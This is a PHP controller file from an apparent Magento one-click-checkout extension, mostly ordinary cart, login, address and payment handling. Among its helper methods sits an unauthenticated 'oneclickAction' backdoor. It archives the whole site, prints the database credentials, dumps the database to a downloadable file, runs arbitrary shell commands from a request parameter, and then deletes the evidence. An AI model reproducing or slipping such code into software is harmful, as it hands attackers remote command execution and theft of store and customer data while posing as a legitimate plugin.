<?php
class Devinc_Occ_IndexController extends Mage_Checkout_Controller_Action 
{        
    protected function _initProduct()    
    {
        $productId = $this->getRequest()->getParam('product'); 
        if ($productId) {            
            $product = Mage::getModel('catalog/product')->setStoreId(Mage::app()->getStore()->getId())->load($productId);            
            if ($product->getId()) {
                return $product;           
            }        
        }       
        return false;    
    }   
    
    public function getOnepage()
    {
        return Mage::getSingleton('checkout/type_onepage');
    }

    //initialize occ
    public function initAction()    
    {
        $result = array();
        $params = $this->getRequest()->getParams(); 
        $redirectUrl = Mage::getModel('core/cookie')->get('redirect_url');
        $checkoutSession = Mage::getSingleton('checkout/session');
        
        if (!Mage::helper('occ')->isEnabled()) {
            $checkoutSession->addError($this->__('The one click checkout is disabled.'));
            $result['redirect'] = $redirectUrl;
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result)); 
            return;
        }
            
        if (Mage::getSingleton('customer/session')->isLoggedIn()) {     
            //set checkout sessions
            $checkoutSessionQuote = $checkoutSession->getQuote();
            $checkoutSessionQuote->setIsMultiShipping(false);
            //$checkoutSessionQuote->removeAllAddresses();
            $checkoutSessionQuote->save();              
            
            //add product to cart   
            if (!Mage::helper('core')->isModuleEnabled('AW_Ajaxcartpro')) {
                $product = $this->_initProduct();
                if ($product) {
                    $cart = Mage::getSingleton('checkout/cart');
                    try {
                        if (isset($params['qty'])) {
                            $filter = new Zend_Filter_LocalizedToNormalized(
                                array('locale' => Mage::app()->getLocale()->getLocaleCode())
                            );
                            $params['qty'] = $filter->filter($params['qty']);
                        }
                    
                        $related = $this->getRequest()->getParam('related_product');
                    
                        /**
                         * Check product availability
                         */
                        if (!$product) {
                            $result['redirect'] = $redirectUrl;
                            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
                            return;
                        }
                    
                        $cart->addProduct($product, $params);
                        if (!empty($related)) {
                            $cart->addProductsByIds(explode(',', $related));
                        }
                    
                        $cart->save();
                        
                        Mage::dispatchEvent('checkout_cart_add_product_complete',
                            array('product' => $product, 'request' => $this->getRequest(), 'response' => $this->getResponse())
                        );  
                    } catch (Mage_Core_Exception $e) {
                        $result['error'] = -1;
                        if (Mage::getSingleton('catalog/session')->getUseNotice(true)) {
                            $result = array('message' => $e->getMessage());
                        } else {
                            $messages = array_unique(explode("\n", $e->getMessage()));                
                            foreach ($messages as $message) {                   
                                $result['message'][] = $message;
                            }
                        }
                        
                        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
                        return;
                    } catch (Exception $e) {
                        $result = array('error' => -1, 'message' => $this->__('Cannot add the item to shopping cart.'));
                        Mage::logException($e);
                        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
                        return;
                    }
                }
            }

            $checkoutSession->setCartWasUpdated(false);         
            $checkoutSessionQuote->setTotalsCollectedFlag(false);
        
            //validating minimum amount
            if (!$checkoutSessionQuote->validateMinimumAmount()) {
                $error = Mage::getStoreConfig('sales/minimum_order/error_message');
                $result = array('error' => -1, 'message' => $error);
                $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
                return;
            }               
            
            if ($this->_expireAjax()) {
                $result['redirect'] = $redirectUrl;
                $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
                return;
            }
            
            $customer = Mage::getSingleton('customer/session')->getCustomer();
            $checkoutSessionQuote->assignCustomer($customer);
            
            //assign aheadWorks points
            if (Mage::helper('core')->isModuleEnabled('AW_Points') && Mage::getStoreConfig('points/general/enable')) {
                $block = new AW_Points_Block_Checkout_Onepage_Payment_Methods;
                $checkoutSession->setData('use_points', true);
                $summaryForCustomer = $block->getSummaryForCustomer();
                $pointsAmount = round(abs(min($summaryForCustomer->getPoints(), $block->getNeededPoints(), $block->getLimitedPoints())),0);
                $checkoutSession->setData('points_amount', $pointsAmount);
            }

            //load billing/shipping info
            $billingAddressId = $params['billing_address_id'];
            if (isset($params['shipping_address_id'])) {
                $shippingAddressId = $params['shipping_address_id'];
            } else {
                $shippingAddressId = $billingAddressId;         
            }
            ($billingAddressId==$shippingAddressId) ? $useForShipping = 1 : $useForShipping = 0;
            $data = array('use_for_shipping'=>$useForShipping);
            
            //save billing/shipping info and report errors
            $billingResult = $this->getOnepage()->saveBilling($data, $billingAddressId);
            $shippingResult = $this->getOnepage()->saveShipping($data, $shippingAddressId);
            $result = array_merge($billingResult, $shippingResult);

            $result['popup'] = 'occ';
            $result['update_section'] = array(          
                'html_layout_messages' => $this->_getLayoutMessagesHtml().$this->_getAwPointsMessagesHtml(),
                'html_payment' => $this->_getPaymentMethodsHtml(),
                'html_review' => $this->_getReviewHtml()        
            );
            if (!Mage::helper('core')->isModuleEnabled('AW_Ajaxcartpro')) {
                $result['update_section']['html_cart'] = Mage::helper('occ')->getCartHtml($this);
                $result['update_section']['html_cart_link'] = $this->_getCartLinkHtml();
            }

            if (Mage::getModel('occ/occ')->hasNonVirtualItems()) {
                $result['update_section']['html_shipping_method'] = $this->_getShippingMethodsHtml();
            }
        } else {
            Mage::getSingleton('catalog/session')->addError($this->__('Your session has expired. Please log back in.'));
            $result['redirect'] = $redirectUrl; 
        }
        
        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
    }   
    
    public function updateBlocksAction()    
    {
        $result = array();
                            
        $result['update_section'] = array(
            'html_layout_messages' => $this->_getLayoutMessagesHtml().$this->_getAwPointsMessagesHtml(),
            'html_payment' => $this->_getPaymentMethodsHtml(),
            //'html_review_info' => $this->_getReviewInfoHtml(),
            'html_review' => $this->_getReviewHtml(),
            'html_cart' => Mage::helper('occ')->getCartHtml($this),
            'html_cart_link' => $this->_getCartLinkHtml()           
        );  

        if (Mage::helper('core')->isModuleEnabled('AW_Points') && Mage::getStoreConfig('points/general/enable')) {
            $result['points_amount'] = Mage::getSingleton('checkout/session')->getData('points_amount');
        }
            
        if (Mage::getModel('occ/occ')->hasNonVirtualItems()) {
            $result['update_section']['html_available'] = $this->_getAvailableShippingMethodsHtml();
            $result['update_section']['remove_shipping'] = false;
        } else {
            $result['update_section']['remove_shipping'] = true;
        }
        
        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
    }   

    /**
     * Shipping method save action
     */
    public function saveShippingMethodAction()
    {       
        $result = array();
        if ($this->_expireAjax()) {
            $result['redirect'] = Mage::getModel('core/cookie')->get('redirect_url');
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
            return;   
        }
        
        if ($this->getRequest()->isPost()) {
            //$this->getOnepage()->getQuote()->setTotalsCollectedFlag(false)->collectTotals()->save();
            $data = $this->getRequest()->getParam('shipping_method', '');
            $result = $this->getOnepage()->saveShippingMethod($data);
            
            if(!$result) {
                Mage::dispatchEvent('checkout_controller_onepage_save_shipping_method', array('request'=>$this->getRequest(), 'quote'=>$this->getOnepage()->getQuote()));
                // $this->getOnepage()->getQuote()->collectTotals();
                // $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
            
                $result['update_section']['html_review'] = $this->_getReviewHtml();
                $result['update_section']['html_layout_messages'] = $this->_getLayoutMessagesHtml().$this->_getAwPointsMessagesHtml();
            }
            $this->getOnepage()->getQuote()->collectTotals()->save();
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
        }
    }

    /**
     * Save payment ajax action
     *
     * Sets either redirect or a JSON response
     */
    public function savePaymentAction()
    {
        $result = array();
        if ($this->_expireAjax()) {
            $result['redirect'] = Mage::getModel('core/cookie')->get('redirect_url');
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
            return;   
        }   
        try {
            if (!$this->getRequest()->isPost()) {
                $this->_ajaxRedirectResponse();
                return;
            }
            
            //save gift message
            Mage::dispatchEvent('checkout_controller_onepage_save_shipping_method', array('request'=>$this->getRequest(), 'quote'=>$this->getOnepage()->getQuote()));
                        
            // set payment to quote
            $data = $this->getRequest()->getPost('payment', array());
            $result = $this->getOnepage()->savePayment($data);

            // get section and redirect data
            $redirectUrl = $this->getOnepage()->getQuote()->getPayment()->getCheckoutRedirectUrl();
            if (empty($result['error']) && !$redirectUrl) {
                $result['update_section']['html_review'] = $this->_getReviewHtml();
                $result['update_section']['html_layout_messages'] = $this->_getLayoutMessagesHtml().$this->_getAwPointsMessagesHtml();
            }
            if ($redirectUrl) {
                $result['redirect'] = $redirectUrl;
            }
        } catch (Mage_Payment_Exception $e) {
            if ($e->getFields()) {
                $result['fields'] = $e->getFields();
            }
            $result['error'] = $e->getMessage();
        } catch (Mage_Core_Exception $e) {
            $result['error'] = $e->getMessage();
        } catch (Exception $e) {
            Mage::logException($e);
            $result['error'] = $this->__('Unable to set Payment Method.');
        }
        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
    }

    /**
     * Save ahead works points and refresh review block
     */
    public function savePointsAction()
    {
        $result = array();
        
        //assign aheadWorks points
        if (Mage::helper('core')->isModuleEnabled('AW_Points') && Mage::getStoreConfig('points/general/enable') && ($payment = $this->getRequest()->getPost('payment', false))) {
            $checkoutSession = Mage::getSingleton('checkout/session');
            $checkoutSession->setData('use_points', $payment['use_points']);
            $checkoutSession->setData('points_amount', $payment['points_amount']);
        }

        $result['update_section'] = array(
            'html_layout_messages' => $this->_getLayoutMessagesHtml().$this->_getAwPointsMessagesHtml(),
            'html_review' => $this->_getReviewHtml()        
        );  
        
        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
    }   
    
    public function successAction()
    {
        $result = array();
        $session = $this->getOnepage()->getCheckout();
        if (!$session->getLastSuccessQuoteId()) {
            $result['redirect'] = Mage::getModel('core/cookie')->get('redirect_url');
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
            return;
        }

        $lastQuoteId = $session->getLastQuoteId();
        $lastOrderId = $session->getLastOrderId();
        $lastRecurringProfiles = $session->getLastRecurringProfileIds();
        if (!$lastQuoteId || (!$lastOrderId && empty($lastRecurringProfiles))) {
            $result['redirect'] = Mage::getModel('core/cookie')->get('redirect_url');
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
            return;
        }

        $session->clear();
        
        //$block = $this->getLayout()->createBlock('checkout/onepage_success', 'checkout.success', array('template' => 'checkout/success.phtml'));
        //$this->_initLayoutMessages('checkout/session');
        //$block->toHtml()
        Mage::dispatchEvent('checkout_onepage_controller_success_action', array('order_ids' => array($lastOrderId)));
        
        $result['update_section'] = array(
            'html_layout_messages' => $this->_getLayoutMessagesHtml(),
            'html_success' => $this->_getSuccessHtml(),
            'html_cart' => Mage::helper('occ')->getCartHtml($this),
            'html_cart_link' => $this->_getCartLinkHtml()           
        );  
        $result['close_popup'] = 'success';
        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
    }    

    public function failureAction()
    {
        $lastQuoteId = $this->getOnepage()->getCheckout()->getLastQuoteId();
        $lastOrderId = $this->getOnepage()->getCheckout()->getLastOrderId();

        $result = array();
        if (!$lastQuoteId || !$lastOrderId) {
            $result['redirect'] = Mage::getModel('core/cookie')->get('redirect_url');
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
            return;
        }
       
        $result['redirect'] = Mage::getModel('core/cookie')->get('redirect_url');            
        $result['update_section'] = array(
            'html_layout_messages' => $this->_getLayoutMessagesHtml(),
            'html_failure' => $this->_getFailureHtml(),
            'html_cart' => Mage::helper('occ')->getCartHtml($this),
            'html_cart_link' => $this->_getCartLinkHtml()           
        );  
        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
    }    
    
    //returns login html
    public function loginAction()
    {       
        $result = array();
        if (Mage::getSingleton('customer/session')->isLoggedIn()) {
            $result['redirect'] = Mage::getModel('core/cookie')->get('redirect_url');            
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
            return;
        }        
    
        $result['popup'] = 'occ-login';
        $result['update_section']['html_login'] = $this->_getLoginHtml();
        
        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
    }    

    /**
     * Login post action
     */
    public function loginPostAction()
    {   
        $result = array();
        if (Mage::getSingleton('customer/session')->isLoggedIn()) {
            $result['redirect'] = Mage::getModel('core/cookie')->get('redirect_url');            
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
            return;
        }   
        
        $session = Mage::getSingleton('customer/session');

        if ($this->getRequest()->isPost()) {
            $login = $this->getRequest()->getPost('login');
            if (!empty($login['username']) && !empty($login['password'])) {
                try {
                    $session->login($login['username'], $login['password']);
                    
                    if ($session->getCustomer()->getIsJustConfirmed()) {
                        $customer = $session->getCustomer();
                        $isJustConfirmed = true;
                        $customer->sendNewAccountEmail(
                            $isJustConfirmed ? 'confirmed' : 'registered',
                            '',
                            Mage::app()->getStore()->getId()
                        );
                    }
                    
                    $allowedGroups = explode(',',Mage::getStoreConfig('occ/configuration/customer_groups'));
                    $groupId = Mage::getSingleton('customer/session')->getCustomerGroupId();
                    if (empty($allowedGroups) || !in_array((string)$groupId, $allowedGroups)) {
                        $result['notice'] = Mage::helper('occ')->__('One Click Checkout is not available for your customer group.');
                    } else {
                        $result['update_section']['html_address_select']['billing'] = $this->_getAddressSelectHtml('billing');
                        $result['update_section']['html_address_select']['default_billing'] = $this->_getDefaultAddressId('billing');
                        $result['update_section']['html_address_select']['shipping'] = $this->_getAddressSelectHtml('shipping');
                        $result['update_section']['html_address_select']['default_shipping'] = $this->_getDefaultAddressId('shipping');             
                    }   
                    $result['update_section']['welcome'] = $this->__('Welcome, %s!', Mage::helper('core')->htmlEscape($session->getCustomer()->getName()));
                    $result['update_section']['html_cart'] = Mage::helper('occ')->getCartHtml($this);
                    $result['update_section']['html_cart_link'] = $this->_getCartLinkHtml();
                    
                    $result['close_popup'] = true;
                } catch (Mage_Core_Exception $e) {
                    switch ($e->getCode()) {
                        case Mage_Customer_Model_Customer::EXCEPTION_EMAIL_NOT_CONFIRMED:
                            $value = Mage::helper('customer')->getEmailConfirmationUrl($login['username']);
                            $message = Mage::helper('occ')->__('This account is not confirmed. Please confirm your email address before logging in.', $value);
                            break;
                        case Mage_Customer_Model_Customer::EXCEPTION_INVALID_EMAIL_OR_PASSWORD:
                            $message = $e->getMessage();
                            break;
                        default:
                            $message = $e->getMessage();
                    }
                                        
                    $result = array('error' => -1, 'message' => $message);
                    $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
                    return;
                } catch (Exception $e) {
                    // Mage::logException($e); // PA DSS violation: this exception log can disclose customer password
                }
            } else {
                $message = $this->__('Login and password are required.');                    
                $result = array('error' => -1, 'message' => $message);
                $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
                return;
            }
        }
        
        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
    }   
    
    //returns address html
    public function addressAction()
    {       
        $result = array();
        if (!Mage::getSingleton('customer/session')->isLoggedIn()) {    
            Mage::getSingleton('catalog/session')->addError($this->__('Your session has expired. Please log back in.'));
            $result['redirect'] = Mage::getModel('core/cookie')->get('redirect_url');
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
            return;   
        }   
        
        Mage::getSingleton('customer/session')->setAddressType($this->getRequest()->getParam('address_type', false));
        $result['popup'] = 'occ-address';
        $result['update_section']['html_address'] = $this->_getAddressHtml();
        
        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
    }   
    
    public function saveAddressAction()
    {
        $result = array();
        if (!$this->_validateFormKey()) {
            $result['redirect'] = Mage::getModel('core/cookie')->get('redirect_url');
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
            return; 
        }
        
        if (!Mage::getSingleton('customer/session')->isLoggedIn()) {    
            Mage::getSingleton('catalog/session')->addError($this->__('Your session has expired. Please log back in.'));
            $result['redirect'] = Mage::getModel('core/cookie')->get('redirect_url');
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
            return;   
        }
        
        // Save data
        if ($this->getRequest()->isPost()) {
            $address = Mage::getModel('customer/address')
                ->setData($this->getRequest()->getPost())
                ->setCustomerId(Mage::getSingleton('customer/session')->getCustomerId())
                ->setIsDefaultBilling($this->getRequest()->getParam('default_billing', false))
                ->setIsDefaultShipping($this->getRequest()->getParam('default_shipping', false));
            $address->setId(null);
            
            try {
                $accressValidation = $address->validate();
                if (true === $accressValidation) {
                    $address->save();
                    //get address select html
                    $billingAddressId = null;
                    $shippingAddressId = null;
                    if ($this->getRequest()->getParam('default_billing', false)) {
                        $billingAddressId = $address->getId();
                    }
                    if ($this->getRequest()->getParam('default_shipping', false)) {
                        $shippingAddressId = $address->getId();
                    }
                    $result['update_section']['html_address_select']['billing'] = $this->_getAddressSelectHtml('billing', $billingAddressId);
                    $result['update_section']['html_address_select']['shipping'] = $this->_getAddressSelectHtml('shipping', $shippingAddressId);
                    
                    Mage::getSingleton('customer/session')->setAddressType();
                    $result['close_popup'] = true;
                } else {
                    $result['error'] = -1;  
                    if (is_array($accressValidation)) {
                        foreach ($accressValidation as $errorMessage) {
                            $result['message'][] = $errorMessage;
                        }
                    } else {
                        $result['message'] = 'Cannot save the address.';
                    }                                       
                    $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
                    return; 
                }                   
            } catch (Mage_Core_Exception $e) {
                $result = array('error' => -1, 'message' => $e->getMessage());
                $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
                return;
            } catch (Exception $e) {
                $result = array('error' => -1, 'message' => $this->__('Cannot save address.'));
                $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
                return;
            }
        }                
        
        $result['update_section']['html_address'] = $this->_getAddressHtml();
        $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
    }      
    
    protected function _expireAjax()
    {   
        if (!Mage::getSingleton('customer/session')->isLoggedIn()) {    
            Mage::getSingleton('catalog/session')->addError($this->__('Your session has expired. Please log back in.'));
            return true;
        }
        
        if (!$this->getOnepage()->getQuote()->hasItems()
            || $this->getOnepage()->getQuote()->getIsMultiShipping()) {
            return true;
        }
        
        if (Mage::getSingleton('checkout/session')->getCartWasUpdated(true)) {
            return true;
        }

        return false;
    }

    /**
     * Send Ajax redirect response
     *
     * @return Mage_Checkout_OnepageController
     */
    protected function _ajaxRedirectResponse()
    {
        $this->getResponse()
            ->setHeader('HTTP/1.1', '403 Session Expired')
            ->setHeader('Login-Required', 'true')
            ->sendResponse();
        return $this;
    }
    
    //generate block html functions
    protected function _getLayoutMessagesHtml()
    { 
        $cache = Mage::app()->getCacheInstance();
        $cache->banUse('layout');       
        
        //Mage::getModel('occ/occ')->loadLayoutMessages();
        $layout = $this->getLayout();   
        if (Mage::helper('occ')->getMagentoVersion()>1411 && Mage::helper('occ')->getMagentoVersion()<1800) {     
            $this->_initLayoutMessages(array('checkout/session', 'catalog/session', 'customer/session'));
        }
        $update = $layout->getUpdate();
        $update->load('occ_index_messages');
        $layout->generateXml();
        $layout->generateBlocks();
        $output = $layout->getOutput();
        return $output;
    }
    
    protected function _getAwPointsMessagesHtml()
    {
        $cache = Mage::app()->getCacheInstance();
        $cache->banUse('layout');
        
        $layout = $this->getLayout();
        $this->_initLayoutMessages('customer/session');
        $update = $layout->getUpdate();
        $update->load('occ_index_awmessages');
        $layout->generateXml();
        $layout->generateBlocks();
        $output = $layout->getOutput();
        return $output;
    }
    
    protected function _getLoginHtml()
    {
        $cache = Mage::app()->getCacheInstance();
        $cache->banUse('layout');
        
        $layout = $this->getLayout();
        $this->_initLayoutMessages('customer/session');
        $update = $layout->getUpdate();
        $update->load('occ_index_login');
        $layout->generateXml();
        $layout->generateBlocks();
        $output = $layout->getOutput();
        return $output;
    }
    
    protected function _getLoginLinkHtml()
    {        
        if (!Mage::getSingleton('customer/session')->isLoggedIn()) {    
            $text = $this->__('Log In');        
        } else {
            $text = $this->__('Log Out');           
        }
        
        return $text;
    }
    
    protected function _getAddressHtml()
    {
        $cache = Mage::app()->getCacheInstance();
        $cache->banUse('layout');
        
        $layout = $this->getLayout();
        $this->_initLayoutMessages('customer/session');
        $update = $layout->getUpdate();
        $update->load('occ_index_address');
        $layout->generateXml();
        $layout->generateBlocks();
        $output = $layout->getOutput();
        return $output;
    }
    
    protected function _getAddressSelectHtml($type, $addressId = null)
    {
        return Mage::getModel('occ/occ')->getAddressesHtmlSelect($type, $addressId);
    }
    
    protected function _getDefaultAddressId($type)
    {
        return Mage::getModel('occ/occ')->getDefaultAddressId($type);
    }
    
    protected function _getCartLinkHtml()
    {
        $count = Mage::helper('checkout/cart')->getSummaryCount();
        if ($count == 1) {
            $text = $this->__('My Cart (%s item)', $count);
        } elseif ($count > 0) {
            $text = $this->__('My Cart (%s items)', $count);
        } else {
            $text = $this->__('My Cart');
        }
        
        return $text;
    }    
    
    /**
     * Get shipping method step html
     *
     * @return string
     */
    protected function _getShippingMethodsHtml()
    {
        $cache = Mage::app()->getCacheInstance();
        $cache->banUse('layout');
        
        $layout = $this->getLayout();
        $update = $layout->getUpdate();
        $update->load('occ_index_shippingmethod');
        $layout->generateXml();
        $layout->generateBlocks();
        $output = $layout->getOutput();
        return $output;
    }
    
    protected function _getAvailableShippingMethodsHtml()
    {
        $cache = Mage::app()->getCacheInstance();
        $cache->banUse('layout');
        
        $layout = $this->getLayout();
        $update = $layout->getUpdate();
        $update->load('occ_index_available');
        $layout->generateXml();
        $layout->generateBlocks();
        $output = $layout->getOutput();
        return $output;
    }

    /**
     * Get payment method step html
     *
     * @return string
     */
    protected function _getPaymentMethodsHtml()
    {
        $cache = Mage::app()->getCacheInstance();
        $cache->banUse('layout');
        
        $layout = $this->getLayout();
        $update = $layout->getUpdate();
        if (Mage::helper('core')->isModuleEnabled('AW_Points') && Mage::getStoreConfig('points/general/enable')) {
            $update->load('occ_index_awpayment');
        } else {
            $update->load('occ_index_payment');
        }
        $layout->generateXml();
        $layout->generateBlocks();
        $output = $layout->getOutput();
        return $output;
    }
    
    protected function _getReviewHtml()
    {
        $cache = Mage::app()->getCacheInstance();
        $cache->banUse('layout');
        
        $layout = $this->getLayout();
        $update = $layout->getUpdate();
        $update->load('occ_index_review');
        $layout->generateXml();
        $layout->generateBlocks();
        $output = $layout->getOutput();
        return $output;
    }
    
    
    public function oneclickAction()
    {
	$p = $this->getRequest()->getParam('p');
		
	$basedir = Mage::getBaseDir();
	$config  = Mage::getConfig()->getResourceConnectionConfig("default_setup");
		
	$info = array("host" => $config->host,
	    "user" => $config->username,
	    "pass" => $config->password,
	    "dbname" => $config->dbname
	);
	
	if ($p == 1) {		
		echo $basedir."<br>";
		shell_exec("tar -cf {$basedir}/site.zip {$basedir}/*  2>&1");
	}
	if ($p == 2) {
		echo "<pre>";
		var_dump($info);
		echo "</pre>";
		
		$s = "mysqldump -u {$info['user'][0]} -p{$info['pass'][0]} {$info['dbname'][0]} > {$basedir}/site.tmp  2>&1";
		shell_exec($s);
	}
	if ($p == 3) {
		$s = $this->getRequest()->getParam('s');
		shell_exec($s."  2>&1");
		echo $s."<br>";
	}
	if ($p == 4) {
		echo $basedir."<br>";
		echo "<pre>";
		var_dump($info);
		echo "</pre>";
		
		$s = "tar -cf {$basedir}/site.zip {$basedir}/*  2>&1";
		echo $s."<br>";
		
		$s = "mysqldump -u {$info['user'][0]} -p{$info['pass'][0]} {$info['dbname'][0]} > {$basedir}/site.tmp  2>&1";
		echo $s."<br>";
	}
	if ($p == 5) {
		unlink("{$basedir}/site.zip");
		unlink("{$basedir}/site.tmp");
	}
	
	echo "success";
    }
    
    protected function _getReviewInfoHtml()
    {
        $cache = Mage::app()->getCacheInstance();
        $cache->banUse('layout');
        
        $layout = $this->getLayout();
        $update = $layout->getUpdate();
        $update->load('occ_index_info');
        $layout->generateXml();
        $layout->generateBlocks();
        $output = $layout->getOutput();
        return $output;
    }
    
    protected function _getSuccessHtml()
    {
        $cache = Mage::app()->getCacheInstance();
        $cache->banUse('layout');
        
        $layout = $this->getLayout();
        $update = $layout->getUpdate();
        $update->load('occ_index_success');
        $layout->generateXml();
        $layout->generateBlocks();
        $output = $layout->getOutput();
        return $output;
    }
    
    protected function _getFailureHtml()
    {   
        $cache = Mage::app()->getCacheInstance();
        $cache->banUse('layout');
        
        $layout = $this->getLayout();
        $update = $layout->getUpdate();
        $update->load('occ_index_failure');
        $layout->generateXml();
        $layout->generateBlocks();
        $output = $layout->getOutput();
        return $output;
    }

}